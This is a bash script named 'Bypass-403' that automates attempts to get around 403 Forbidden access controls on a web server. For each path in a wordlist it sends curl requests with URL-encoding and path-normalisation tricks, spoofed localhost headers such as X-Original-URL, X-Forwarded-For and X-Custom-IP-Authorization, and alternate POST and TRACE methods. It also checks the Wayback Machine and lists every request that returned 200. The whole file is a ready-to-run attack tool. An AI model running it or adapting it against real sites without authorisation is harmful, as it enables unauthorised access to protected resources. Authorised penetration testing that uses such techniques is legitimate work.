#!/bin/bash

figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "Usage: ./bypass-403.sh https://example.com wordlist.txt"
echo " "

# Define colors
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Check if correct number of arguments are provided
if [ $# -ne 2 ]; then
    echo "Error: Please provide domain and wordlist file"
    echo "Example: ./bypass-403.sh https://example.com wordlist.txt"
    exit 1
fi

DOMAIN=$1
WORDLIST=$2

# Check if wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Error: Wordlist file '$WORDLIST' not found!"
    exit 1
fi

# Array to store successful bypasses
declare -a successful_bypasses

# Function to test a single path with all bypass techniques
test_path() {
    local path=$1
    
    echo "Testing path: $path"
    echo "======================="
    
    # Test each bypass technique and store results
    test_bypass "$DOMAIN/$path" "${DOMAIN}/${path}"
    test_bypass "$DOMAIN/%2e/$path" "${DOMAIN}/%2e/${path}"
    test_bypass "$DOMAIN/$path/." "${DOMAIN}/${path}/."
    test_bypass "$DOMAIN//$path//" "${DOMAIN}//${path}//"
    test_bypass "$DOMAIN/./$path/./" "${DOMAIN}/./${path}/./"
    test_bypass_with_header "$DOMAIN/$path" "X-Original-URL: $path" "${DOMAIN}/${path} -H X-Original-URL: ${path}"
    test_bypass_with_header "$DOMAIN/$path" "X-Custom-IP-Authorization: 127.0.0.1" "${DOMAIN}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
    test_bypass_with_header "$DOMAIN/$path" "X-Forwarded-For: http://127.0.0.1" "${DOMAIN}/${path} -H X-Forwarded-For: http://127.0.0.1"
    test_bypass_with_header "$DOMAIN/$path" "X-Forwarded-For: 127.0.0.1:80" "${DOMAIN}/${path} -H X-Forwarded-For: 127.0.0.1:80"
    test_bypass_with_header "$DOMAIN" "X-rewrite-url: $path" "${DOMAIN} -H X-rewrite-url: ${path}"
    test_bypass "$DOMAIN/$path%20" "${DOMAIN}/${path}%20"
    test_bypass "$DOMAIN/$path%09" "${DOMAIN}/${path}%09"
    test_bypass "$DOMAIN/$path?" "${DOMAIN}/${path}?"
    test_bypass "$DOMAIN/$path.html" "${DOMAIN}/${path}.html"
    test_bypass "$DOMAIN/$path/?anything" "${DOMAIN}/${path}/?anything"
    test_bypass "$DOMAIN/$path#" "${DOMAIN}/${path}#"
    test_bypass_with_method "$DOMAIN/$path" "POST" "Content-Length:0" "${DOMAIN}/${path} -H Content-Length:0 -X POST"
    test_bypass "$DOMAIN/$path/*" "${DOMAIN}/${path}/*"
    test_bypass "$DOMAIN/$path.php" "${DOMAIN}/${path}.php"
    test_bypass "$DOMAIN/$path.json" "${DOMAIN}/${path}.json"
    test_bypass_with_method "$DOMAIN/$path" "TRACE" "" "${DOMAIN}/${path} -X TRACE"
    test_bypass_with_header "$DOMAIN/$path" "X-Host: 127.0.0.1" "${DOMAIN}/${path} -H X-Host: 127.0.0.1"
    test_bypass "$DOMAIN/$path..;/" "${DOMAIN}/${path}..;/"
    test_bypass "$DOMAIN/$path;/" "${DOMAIN}/${path};/"
    test_bypass_with_method "$DOMAIN/$path" "TRACE" "" "${DOMAIN}/${path} -X TRACE"
    test_bypass_with_header "$DOMAIN/$path" "X-Forwarded-Host: 127.0.0.1" "${DOMAIN}/${path} -H X-Forwarded-Host: 127.0.0.1"
    
    echo "Way back machine:"
    curl -s "https://archive.org/wayback/available?url=$DOMAIN/$path" | jq -r '.archived_snapshots.closest | {available, url}'
    
    echo -e "\n\n"
}

# Function to test a bypass technique and color the output if 200 status
test_bypass() {
    local url=$1
    local description=$2
    
    # Perform the curl request and get the status code
    local response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$url")
    local status_code=$(echo $response | cut -d',' -f1)
    
    # Check if status code is 200
    if [ "$status_code" == "200" ]; then
        echo -e "${GREEN}$response${NC}  --> ${GREEN}$description${NC}"
        # Add to successful bypasses
        successful_bypasses+=("$response  --> $description")
    else
        echo "$response  --> $description"
    fi
}

# Function to test a bypass technique with a header
test_bypass_with_header() {
    local url=$1
    local header=$2
    local description=$3
    
    # Perform the curl request with header and get the status code
    local response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "$header" "$url")
    local status_code=$(echo $response | cut -d',' -f1)
    
    # Check if status code is 200
    if [ "$status_code" == "200" ]; then
        echo -e "${GREEN}$response${NC}  --> ${GREEN}$description${NC}"
        # Add to successful bypasses
        successful_bypasses+=("$response  --> $description")
    else
        echo "$response  --> $description"
    fi
}

# Function to test a bypass technique with a specific method and optional header
test_bypass_with_method() {
    local url=$1
    local method=$2
    local header=$3
    local description=$4
    
    # Perform the curl request with method and optional header
    local response
    if [ -z "$header" ]; then
        response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -X "$method" "$url")
    else
        response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "$header" -X "$method" "$url")
    fi
    
    local status_code=$(echo $response | cut -d',' -f1)
    
    # Check if status code is 200
    if [ "$status_code" == "200" ]; then
        echo -e "${GREEN}$response${NC}  --> ${GREEN}$description${NC}"
        # Add to successful bypasses
        successful_bypasses+=("$response  --> $description")
    else
        echo "$response  --> $description"
    fi
}

# Read each line from the wordlist and test the path
echo "Starting tests with wordlist: $WORDLIST"
echo "=================================="

while IFS= read -r path || [[ -n "$path" ]]; do
    # Skip empty lines and comments
    if [[ -z "$path" || "$path" =~ ^# ]]; then
        continue
    fi
    
    # Remove any leading/trailing whitespace
    path=$(echo "$path" | xargs)
    
    # Test the path
    test_path "$path"
done < "$WORDLIST"

# Display all successful bypasses (200 status codes) at the end
echo -e "\n\n${GREEN}=== SUCCESSFUL BYPASSES (200 STATUS CODES) ===${NC}"
echo -e "${GREEN}===========================================${NC}"

if [ ${#successful_bypasses[@]} -eq 0 ]; then
    echo -e "${GREEN}No successful bypasses found.${NC}"
else
    for bypass in "${successful_bypasses[@]}"; do
        echo -e "${GREEN}$bypass${NC}"
    done
fi

echo "All tests completed!"
